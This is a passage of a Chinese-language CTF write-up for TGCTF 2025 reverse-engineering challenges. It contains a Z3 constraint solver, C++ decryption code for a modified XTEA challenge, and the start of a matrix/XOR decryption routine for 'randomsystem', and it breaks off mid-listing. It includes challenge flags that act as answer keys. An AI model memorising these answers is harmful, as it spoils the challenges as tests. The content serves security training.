class="number">9</span>]) + <span class="number">9</span> * Enc[<span class="number">10</span>] - <span class="number">23</span> * Enc[<span class="number">11</span>] - <span class="number">102</span> * Enc[<span class="number">12</span>]) + <span class="number">6</span> * Enc[<span class="number">13</span>] + <span class="number">2050</span> * Enc[<span class="number">14</span>] - <span class="number">406</span> * Enc[<span class="number">15</span>]) + <span class="number">665</span> * Enc[<span class="number">16</span>] + <span class="number">333</span> * Enc[<span class="number">17</span>] + <span class="number">100</span> * Enc[<span class="number">18</span>] + <span class="number">609</span> * Enc[<span class="number">19</span>] + <span class="number">777</span> * Enc[<span class="number">20</span>] + <span class="number">201</span> * Enc[<span class="number">21</span>] - <span class="number">22</span> * Enc[<span class="number">22</span>] == <span class="number">111844</span>)</span><br><span class="line">s.add((((((((<span class="number">1</span> * Enc[<span class="number">0</span>] - <span class="number">22</span> * Enc[<span class="number">1</span>]) + <span class="number">333</span> * Enc[<span class="number">2</span>] + <span class="number">4444</span> * Enc[<span class="number">3</span>] - <span class="number">5555</span> * Enc[<span class="number">4</span>]) + <span class="number">6666</span> * Enc[<span class="number">5</span>] - <span class="number">666</span> * Enc[<span class="number">6</span>]) + <span class="number">676</span> * Enc[<span class="number">7</span>] - <span class="number">660</span> * Enc[<span class="number">8</span>] - <span class="number">22</span> * Enc[<span class="number">9</span>]) + <span class="number">9</span> * Enc[<span class="number">10</span>] - <span class="number">73</span> * Enc[<span class="number">11</span>] - <span class="number">107</span> * Enc[<span class="number">12</span>]) + <span class="number">6</span> * Enc[<span class="number">13</span>] + <span class="number">250</span> * Enc[<span class="number">14</span>] - <span class="number">6</span> * Enc[<span class="number">15</span>]) + <span class="number">65</span> * Enc[<span class="number">16</span>] + <span class="number">39</span> * Enc[<span class="number">17</span>] + <span class="number">10</span> * Enc[<span class="number">18</span>] + <span class="number">69</span> * Enc[<span class="number">19</span>] + <span class="number">777</span> * Enc[<span class="number">20</span>] + <span class="number">201</span> * Enc[<span class="number">21</span>] - <span class="number">2</span> * Enc[<span class="number">22</span>]) + <span class="number">23</span> * Enc[<span class="number">23</span>] == <span class="number">159029</span>)</span><br><span class="line">s.add((((<span class="number">520</span> * Enc[<span class="number">0</span>] - <span class="number">222</span> * Enc[<span class="number">1</span>]) + <span class="number">333</span> * Enc[<span class="number">2</span>] + <span class="number">4</span> * Enc[<span class="number">3</span>] - <span class="number">56655</span> * Enc[<span class="number">4</span>]) + <span class="number">6666</span> * Enc[<span class="number">5</span>] + <span class="number">666</span> * Enc[<span class="number">6</span>] + <span class="number">66</span> * Enc[<span class="number">7</span>] - <span class="number">60</span> * Enc[<span class="number">8</span>] - <span class="number">220</span> * Enc[<span class="number">9</span>]) + <span class="number">99</span> * Enc[<span class="number">10</span>] + <span class="number">73</span> * Enc[<span class="number">11</span>] + <span class="number">1007</span> * Enc[<span class="number">12</span>] + <span class="number">7777</span> * Enc[<span class="number">13</span>] + <span class="number">2500</span> * Enc[<span class="number">14</span>] + <span class="number">6666</span> * Enc[<span class="number">15</span>] + <span class="number">605</span> * Enc[<span class="number">16</span>] + <span class="number">390</span> * Enc[<span class="number">17</span>] + <span class="number">100</span> * Enc[<span class="number">18</span>] + <span class="number">609</span> * Enc[<span class="number">19</span>] + <span class="number">99999</span> * Enc[<span class="number">20</span>] + <span class="number">210</span> * Enc[<span class="number">21</span>] + <span class="number">232</span> * Enc[<span class="number">22</span>] + <span class="number">23</span> * Enc[<span class="number">23</span>] - <span class="number">24</span> * Enc[<span class="number">24</span>] == <span class="number">2762025</span>)</span><br><span class="line">s.add(((((<span class="number">1323</span> * Enc[<span class="number">0</span>] - <span class="number">22</span> * Enc[<span class="number">1</span>]) + <span class="number">333</span> * Enc[<span class="number">2</span>] + <span class="number">4</span> * Enc[<span class="number">3</span>] - <span class="number">55</span> * Enc[<span class="number">4</span>]) + <span class="number">666</span> * Enc[<span class="number">5</span>] + <span class="number">666</span> * Enc[<span class="number">6</span>] + <span class="number">66</span> * Enc[<span class="number">7</span>] - <span class="number">660</span> * Enc[<span class="number">8</span>] - <span class="number">220</span> * Enc[<span class="number">9</span>]) + <span class="number">99</span> * Enc[<span class="number">10</span>] + <span class="number">3</span> * Enc[<span class="number">11</span>] + <span class="number">100</span> * Enc[<span class="number">12</span>] + <span class="number">777</span> * Enc[<span class="number">13</span>] + <span class="number">2500</span> * Enc[<span class="number">14</span>] + <span class="number">6666</span> * Enc[<span class="number">15</span>] + <span class="number">605</span> * Enc[<span class="number">16</span>] + <span class="number">390</span> * Enc[<span class="number">17</span>] + <span class="number">100</span> * Enc[<span class="number">18</span>] + <span class="number">609</span> * Enc[<span class="number">19</span>] + <span class="number">9999</span> * Enc[<span class="number">20</span>] + <span class="number">210</span> * Enc[<span class="number">21</span>] + <span class="number">232</span> * Enc[<span class="number">22</span>] + <span class="number">23</span> * Enc[<span class="number">23</span>] - <span class="number">24</span> * Enc[<span class="number">24</span>]) + <span class="number">25</span> * Enc[<span class="number">25</span>] == <span class="number">1551621</span>)</span><br><span class="line">s.add((((((<span class="number">777</span> * Enc[<span class="number">0</span>] - <span class="number">22</span> * Enc[<span class="number">1</span>]) + <span class="number">6969</span> * Enc[<span class="number">2</span>] + <span class="number">4</span> * Enc[<span class="number">3</span>] - <span class="number">55</span> * Enc[<span class="number">4</span>]) + <span class="number">666</span> * Enc[<span class="number">5</span>] - <span class="number">6</span> * Enc[<span class="number">6</span>]) + <span class="number">96</span> * Enc[<span class="number">7</span>] - <span class="number">60</span> * Enc[<span class="number">8</span>] - <span class="number">220</span> * Enc[<span class="number">9</span>]) + <span class="number">99</span> * Enc[<span class="number">10</span>] + <span class="number">3</span> * Enc[<span class="number">11</span>] + <span class="number">100</span> * Enc[<span class="number">12</span>] + <span class="number">777</span> * Enc[<span class="number">13</span>] + <span class="number">250</span> * Enc[<span class="number">14</span>] + <span class="number">666</span> * Enc[<span class="number">15</span>] + <span class="number">65</span> * Enc[<span class="number">16</span>] + <span class="number">90</span> * Enc[<span class="number">17</span>] + <span class="number">100</span> * Enc[<span class="number">18</span>] + <span class="number">609</span> * Enc[<span class="number">19</span>] + <span class="number">999</span> * Enc[<span class="number">20</span>] + <span class="number">21</span> * Enc[<span class="number">21</span>] + <span class="number">232</span> * Enc[<span class="number">22</span>] + <span class="number">23</span> * Enc[<span class="number">23</span>] - <span class="number">24</span> * Enc[<span class="number">24</span>]) + <span class="number">25</span> * Enc[<span class="number">25</span>] - <span class="number">26</span> * Enc[<span class="number">26</span>] == <span class="number">948348</span>)</span><br><span class="line">s.add(((((((<span class="number">97</span> * Enc[<span class="number">0</span>] - <span class="number">22</span> * Enc[<span class="number">1</span>]) + <span class="number">6969</span> * Enc[<span class="number">2</span>] + <span class="number">4</span> * Enc[<span class="number">3</span>] - <span class="number">56</span> * Enc[<span class="number">4</span>]) + <span class="number">96</span> * Enc[<span class="number">5</span>] - <span class="number">6</span> * Enc[<span class="number">6</span>]) + <span class="number">96</span> * Enc[<span class="number">7</span>] - <span class="number">60</span> * Enc[<span class="number">8</span>] - <span class="number">20</span> * Enc[<span class="number">9</span>]) + <span class="number">99</span> * Enc[<span class="number">10</span>] + <span class="number">3</span> * Enc[<span class="number">11</span>] + <span class="number">10</span> * Enc[<span class="number">12</span>] + <span class="number">707</span> * Enc[<span class="number">13</span>] + <span class="number">250</span> * Enc[<span class="number">14</span>] + <span class="number">666</span> * Enc[<span class="number">15</span>] + -<span class="number">9</span> * Enc[<span class="number">16</span>] + <span class="number">90</span> * Enc[<span class="number">17</span>] + -<span class="number">2</span> * Enc[<span class="number">18</span>] + <span class="number">609</span> * Enc[<span class="number">19</span>] + <span class="number">0</span> * Enc[<span class="number">20</span>] + <span class="number">21</span> * Enc[<span class="number">21</span>] + <span class="number">2</span> * Enc[<span class="number">22</span>] + <span class="number">23</span> * Enc[<span class="number">23</span>] - <span class="number">24</span> * Enc[<span class="number">24</span>]) + <span class="number">25</span> * Enc[<span class="number">25</span>] - <span class="number">26</span> * Enc[<span class="number">26</span>]) + <span class="number">27</span> * Enc[<span class="number">27</span>] == <span class="number">777044</span>)</span><br><span class="line">s.add((((((<span class="number">177</span> * Enc[<span class="number">0</span>] - <span class="number">22</span> * Enc[<span class="number">1</span>]) + <span class="number">699</span> * Enc[<span class="number">2</span>] + <span class="number">64</span> * Enc[<span class="number">3</span>] - <span class="number">56</span> * Enc[<span class="number">4</span>] - <span class="number">96</span> * Enc[<span class="number">5</span>] - <span class="number">66</span> * Enc[<span class="number">6</span>]) + <span class="number">96</span> * Enc[<span class="number">7</span>] - <span class="number">60</span> * Enc[<span class="number">8</span>] - <span class="number">20</span> * Enc[<span class="number">9</span>]) + <span class="number">99</span> * Enc[<span class="number">10</span>] + <span class="number">3</span> * Enc[<span class="number">11</span>] + <span class="number">10</span> * Enc[<span class="number">12</span>] + <span class="number">707</span> * Enc[<span class="number">13</span>] + <span class="number">250</span> * Enc[<span class="number">14</span>] + <span class="number">666</span> * Enc[<span class="number">15</span>] + -<span class="number">9</span> * Enc[<span class="number">16</span>] + <span class="number">0</span> * Enc[<span class="number">17</span>] + -<span class="number">2</span> * Enc[<span class="number">18</span>] + <span class="number">69</span> * Enc[<span class="number">19</span>] + <span class="number">0</span> * Enc[<span class="number">20</span>] + <span class="number">21</span> * Enc[<span class="number">21</span>] + <span class="number">222</span> * Enc[<span class="number">22</span>] + <span class="number">23</span> * Enc[<span class="number">23</span>] - <span class="number">224</span> * Enc[<span class="number">24</span>]) + <span class="number">25</span> * Enc[<span class="number">25</span>] - <span class="number">26</span> * Enc[<span class="number">26</span>]) + <span class="number">27</span> * Enc[<span class="number">27</span>] - <span class="number">28</span> * Enc[<span class="number">28</span>] == <span class="number">185016</span>)</span><br><span class="line">s.add(((((((<span class="number">77</span> * Enc[<span class="number">0</span>] - <span class="number">2</span> * Enc[<span class="number">1</span>]) + <span class="number">6</span> * Enc[<span class="number">2</span>] + <span class="number">6</span> * Enc[<span class="number">3</span>] - <span class="number">96</span> * Enc[<span class="number">4</span>] - <span class="number">9</span> * Enc[<span class="number">5</span>] - <span class="number">6</span> * Enc[<span class="number">6</span>]) + <span class="number">96</span> * Enc[<span class="number">7</span>] - <span class="number">0</span> * Enc[<span class="number">8</span>] - <span class="number">20</span> * Enc[<span class="number">9</span>]) + <span class="number">99</span> * Enc[<span class="number">10</span>] + <span class="number">3</span> * Enc[<span class="number">11</span>] + <span class="number">10</span> * Enc[<span class="number">12</span>] + <span class="number">707</span> * Enc[<span class="number">13</span>] + <span class="number">250</span> * Enc[<span class="number">14</span>] + <span class="number">666</span> * Enc[<span class="number">15</span>] + -<span class="number">9</span> * Enc[<span class="number">16</span>] + <span class="number">0</span> * Enc[<span class="number">17</span>] + -<span class="number">2</span> * Enc[<span class="number">18</span>] + <span class="number">9</span> * Enc[<span class="number">19</span>] + <span class="number">0</span> * Enc[<span class="number">20</span>] + <span class="number">21</span> * Enc[<span class="number">21</span>] + <span class="number">222</span> * Enc[<span class="number">22</span>] + <span class="number">23</span> * Enc[<span class="number">23</span>] - <span class="number">224</span> * Enc[<span class="number">24</span>]) + <span class="number">26</span> * Enc[<span class="number">25</span>] - -<span class="number">58</span> * Enc[<span class="number">26</span>]) + <span class="number">27</span> * Enc[<span class="number">27</span>] - <span class="number">2</span> * Enc[<span class="number">28</span>]) + <span class="number">29</span> * Enc[<span class="number">29</span>] == <span class="number">130106</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> Enc:</span><br><span class="line">    s.add(x &gt;= <span class="number">32</span>)</span><br><span class="line">    s.add(x &lt;= <span class="number">126</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    m = s.model()</span><br><span class="line"></span><br><span class="line">    solution = [m[x].as_long() <span class="keyword">if</span> m[x] <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">for</span> x <span class="keyword">in</span> Enc]</span><br><span class="line">    </span><br><span class="line">    decrypted = decrypt(solution)</span><br><span class="line">    <span class="built_in">print</span>(decrypted)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;No solution found&quot;</span>)</span><br></pre></td></tr></table></figure><p>HZNUCTF{ad7fa-76a7-ff6a-fffa-7f7d6a}</p><h2 id="XTEA"><a href="#XTEA" class="headerlink" title="XTEA"></a>XTEA</h2><p>初始化置种子 srand 了一次，然后这边里面判断是否有调试，然后又 srand 了一遍，可以忽略，种子就是 0x7E8。</p><p>红框处是将输入字符串四个四个一组进行翻转。</p><p><img src="/2025/04/13/TGCTF2025/LcFbbxbB8oLeYkxPI0acu3jPnMd.png"></p><p>InitKey 函数是用 rand 初始化了四个整数 Key。</p><p><img src="/2025/04/13/TGCTF2025/AhYVbAhIAobk91xB8j2cPWAjnad.png"></p><p>XTea 是魔改的，Delta 是靠用户输入传进来的，那么这边 Delta 未知就需要爆破。</p><p><img src="/2025/04/13/TGCTF2025/AhYXbfXq2oKkj0xtpUlc8qldnAe.png"></p><p>题目描述说有点 misc 味，发现附件中还有个 readme 里面的压缩包密码就是标准 Delta，<strong>2654435769 -&gt; 0x9E3779B9</strong></p><p>直接编写解密，使用该 Delta 就可以解出 flag。</p><p>解密代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span> *__fastcall <span class="title">dec</span><span class="params">(<span class="type">int</span> _a1_, <span class="type">unsigned</span> <span class="type">int</span> *_a2_, <span class="type">unsigned</span> <span class="type">int</span> *_a3_, <span class="type">unsigned</span> <span class="type">int</span> _a4_)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> *result; <span class="comment">// rax</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v5;      <span class="comment">// [rsp+24h] [rbp+4h]</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v6;      <span class="comment">// [rsp+44h] [rbp+24h]</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v7;      <span class="comment">// [rsp+64h] [rbp+44h]</span></span><br><span class="line">    <span class="type">int</span> i;                <span class="comment">// [rsp+84h] [rbp+64h]</span></span><br><span class="line"></span><br><span class="line">    v5 = *_a2_;</span><br><span class="line">    v6 = *_a3_;</span><br><span class="line">    v7 = <span class="number">0</span>;</span><br><span class="line">    v7 = -_a1_ * <span class="number">32</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">32</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        v6 -= (*(DWORD *)(_a4_ + <span class="number">4LL</span> * ((v7 &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>)) + v7) ^ (v5 + ((v5 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">16</span> * v5)));</span><br><span class="line">        v7 += _a1_;</span><br><span class="line">        v5 -= (*(DWORD *)(_a4_ + <span class="number">4LL</span> * (v7 &amp; <span class="number">3</span>)) + v7) ^ (v6 + ((v6 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">16</span> * v6)));</span><br><span class="line">    &#125;</span><br><span class="line">    *_a2_ = v5;</span><br><span class="line">    result = _a3_;</span><br><span class="line">    *_a3_ = v6;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> buffer[] = &#123;</span><br><span class="line">        <span class="number">0x24</span>, <span class="number">0x23</span>, <span class="number">0xCB</span>, <span class="number">0x8C</span>, <span class="number">0x1A</span>, <span class="number">0x74</span>, <span class="number">0xA7</span>, <span class="number">0x09</span>,</span><br><span class="line">        <span class="number">0x8D</span>, <span class="number">0x67</span>, <span class="number">0x3C</span>, <span class="number">0xFB</span>, <span class="number">0x79</span>, <span class="number">0x3A</span>, <span class="number">0x08</span>, <span class="number">0xF6</span>,</span><br><span class="line">        <span class="number">0x1B</span>, <span class="number">0x24</span>, <span class="number">0xCC</span>, <span class="number">0xF1</span>, <span class="number">0xF2</span>, <span class="number">0x59</span>, <span class="number">0xFA</span>, <span class="number">0x39</span>,</span><br><span class="line">        <span class="number">0xCC</span>, <span class="number">0xE1</span>, <span class="number">0xAB</span>, <span class="number">0xF2</span>, <span class="number">0x72</span>, <span class="number">0x9F</span>, <span class="number">0x18</span>, <span class="number">0x17</span>&#125;;</span><br><span class="line">    <span class="built_in">srand</span>(<span class="number">0x7e8</span>);</span><br><span class="line">    <span class="comment">// 初始化Key</span></span><br><span class="line">    <span class="type">uint32_t</span> key[<span class="number">4</span>]&#123;&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">        key[i] = <span class="built_in">rand</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">7</span>; j &gt; <span class="number">0</span>; j--)</span><br><span class="line">        <span class="built_in">dec</span>(<span class="number">0x9E3779B9</span>, (<span class="type">unsigned</span> <span class="type">int</span> *)(buffer + (j - <span class="number">1</span>) * <span class="number">4</span>), (<span class="type">unsigned</span> <span class="type">int</span> *)(buffer + j * <span class="number">4</span>), (<span class="type">uint32_t</span>)key);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 四个字节一组进行翻转</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span>; j += <span class="number">4</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">auto</span> tmp = *((<span class="type">char</span> *)buffer + j + <span class="number">3</span>) | (*((<span class="type">char</span> *)buffer + j + <span class="number">2</span>) &lt;&lt; <span class="number">8</span>) | (*((<span class="type">char</span> *)buffer + j + <span class="number">1</span>) &lt;&lt; <span class="number">16</span>) | (*((<span class="type">char</span> *)buffer + j) &lt;&lt; <span class="number">24</span>);</span><br><span class="line">        *(<span class="type">int</span> *)(buffer + j) = tmp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.32s\n&quot;</span>, buffer);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>HZNUCTF{ae6-9f57-4b74-b423-98eb}</p><h2 id="randomsystem"><a href="#randomsystem" class="headerlink" title="randomsystem"></a>randomsystem</h2><p>第一部分是输入 64 字节大小的 0101 二进制数据，然后进行转换到 Hex（倒序），再倒序回来拆分半个字节转到 ascii 字符。</p><p>如：0101001001100101 第一次函数后是 0x65，0x52 然后再翻转拆分为 ascii 字符’5’,’2’,’6’,’5’。</p><p><img src="/2025/04/13/TGCTF2025/TxRSbtlaOoGfE9xuGS8chr7snuc.png"></p><p>根据判断判断出的字符可知要输入的是 52 65 56 65 52 65 53 65 的二进制数据。</p><p><code>0101001001100101010101100110010101010010011001010101001101100101</code></p><p>底下的一些加密函数里面有花指令，是基础花指令，这边不做多赘述。</p><p>第一部分用固定种子的随机数初始化了一个 v18 数值列表。</p><p><img src="/2025/04/13/TGCTF2025/E57zbT7UAouWIoxT4qbcAgg8nLg.png"></p><p>然后进行四次加密。</p><p><img src="/2025/04/13/TGCTF2025/U8vVbo1XroTRa3x38f2cevkEndh.png"></p><p>Enc1 是用随机数初始化的列表进行打乱输入字符串的顺序。</p><p><img src="/2025/04/13/TGCTF2025/F2GsbyGsLoVzmTxG1zzcg2h0nlb.png"></p><p>Enc2 是将输入字符串转存到另一个二维数组。</p><p><img src="/2025/04/13/TGCTF2025/SSyIbLzGao8Nbmx7pcNckZyhnpd.png"></p><p>第三个函数是将之前输入转换后的 Key 存到”Str”中，实际值就是 <strong>ReVeReSe</strong></p><p>第四个函数是用一个全局的矩阵乘上输入数据。</p><p><img src="/2025/04/13/TGCTF2025/LZg4btpJ4odkaRxmWcrco0OTngf.png"></p><p>最后和 Key 进行循环异或加密。</p><p><img src="/2025/04/13/TGCTF2025/JLNAbr3vIo0mX6xHpmZct8gmnth.png"></p><p>所以解密流程就是这几步的翻转，需要先计算出全局矩阵数据的逆矩阵，这一步用在线网站就可以解得。</p><p>Enc1 由于是对称的可以直接用原函数，Enc3 也可以直接用原函数把矩阵数据改成逆矩阵就是解密。</p><p>解密代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Enc1</span><span class="params">(<span class="type">char</span> *_Str_, <span class="type">int</span> *_RdList_)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> v3;   <span class="comment">// [esp+D3h] [ebp-1Dh]</span></span><br><span class="line">    <span class="type">size_t</span> i;  <span class="comment">// [esp+DCh] [ebp-14h]</span></span><br><span class="line">    <span class="type">size_t</span> v5; <span class="comment">// [esp+E8h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">    v5 = <span class="number">64</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>;; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">auto</span> result = v5 &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (i &gt;= v5 &gt;&gt; <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> (_RdList_[i] &gt;= <span class="number">0</span> &amp;&amp; _RdList_[i] &lt; v5)</span><br><span class="line">        &#123;</span><br><span class="line">            v3 = _Str_[i];</span><br><span class="line">            _Str_[i] = _Str_[v5 - _RdList_[i] - <span class="number">1</span>];</span><br><span class="line">            _Str_[v5 - _RdList_[i] - <span class="number">1</span>] = v3;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Enc2</span><span class="params">(<span class="type">char</span> *_a1_, <span class="type">char</span> *_a2_)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> j;  <span class="comment">// [esp+D0h] [ebp-20h]</span></span><br><span class="line">    <span class="type">int</span> i;  <span class="comment">// [esp+DCh] [ebp-14h]</span></span><br><span class="line">    <span class="type">int</span> v4; <span class="comment">// [esp+E8h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">    v4 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">8</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">8</span>; ++j)</span><br><span class="line">            *&amp;_a1_[<span class="number">32</span> * i + <span class="number">4</span> * j] = _a2_[v4++];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> dword_3FC368[] = &#123;</span><br><span class="line">    <span class="number">0x00000001</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span 